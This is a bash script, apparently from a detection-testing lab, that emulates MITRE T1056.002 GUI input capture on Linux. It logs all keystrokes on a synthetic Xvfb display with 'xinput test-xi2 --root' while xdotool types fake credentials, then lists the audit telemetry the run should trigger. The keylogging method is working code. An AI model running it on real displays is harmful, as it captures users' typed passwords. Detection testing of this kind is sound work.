#!/usr/bin/env bash
# ============================================================================
# ATA053 · T1056.002 GUI Input Capture — ataque custom (propio)
# ----------------------------------------------------------------------------
# Tecnica : T1056.002 Input Capture: GUI Input Capture
#           (tacticas Collection; Credential Access).
# Fuente  : custom (propio). ART NO trae prueba Linux (solo AppleScript/PowerShell
#           para macOS/Windows) -> se escribe a mano el mecanismo X11.
# Objetivo: capturar los eventos de entrada de teclado del display X con
#           `xinput test-xi2 --root` mientras `xdotool` inyecta una entrada
#           sintetica (simula a la victima tecleando credenciales). El keylog
#           queda en `keylog.txt`.
# Display : :99 (Xvfb sintetico, pre-steado ANTES de t0).
# Ejecuta : desde /home/angel/lab-attack/ATA053 (cwd del ataque -> ancla H4)
# Elevacion: NO en la ventana.
#
# GUARDARRAIL: display SINTETICO; entrada SINTETICA (xdotool); sin tocar nada real.
#
# Telemetria esperada (README §5):
#   - execve de xinput             -> 80792 (deteccion; T1056.002-S1).
#   - execve de xdotool            -> 80792 (deteccion; T1056.002-S2).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA053/*` (S3).
#
# Prueba de exito (INDEPENDIENTE de la alerta): keylog.txt con eventos KeyPress.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA053"
export DISPLAY=:99
KEYLOG="$BASE/keylog.txt"

echo "ATA053 · T1056.002 GUI Input Capture (xinput test-xi2 + xdotool sobre Xvfb) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

if ! command -v xinput >/dev/null 2>&1; then echo "ERROR: falta xinput (pre-staging)" >&2; exit 1; fi
if ! command -v xdotool >/dev/null 2>&1; then echo "ERROR: falta xdotool (pre-staging)" >&2; exit 1; fi
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

echo "--- iniciar captura de eventos X11 (xinput test-xi2 --root) ---"
xinput test-xi2 --root > "$KEYLOG" 2>&1 &
XPID=$!
sleep 2

echo "--- inyectar entrada sintetica (xdotool) ---"
xdotool type --delay 60 'usuario=admin password=S3cret2026!'
xdotool key Return
sleep 2

kill "$XPID" 2>/dev/null || true
wait "$XPID" 2>/dev/null || true
sleep 1

echo "keylog_lineas=$(wc -l < "$KEYLOG")"
echo "keypress_eventos=$(grep -c 'KeyPress' "$KEYLOG" 2>/dev/null || echo 0)"
sha256sum "$KEYLOG"
if [ "$(grep -c 'KeyPress' "$KEYLOG" 2>/dev/null || echo 0)" -gt 0 ]; then
  echo "GUI_INPUT_CAPTURE=OK (keylog con eventos KeyPress capturados)"
else
  echo "GUI_INPUT_CAPTURE=FALLO (keylog sin KeyPress)" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
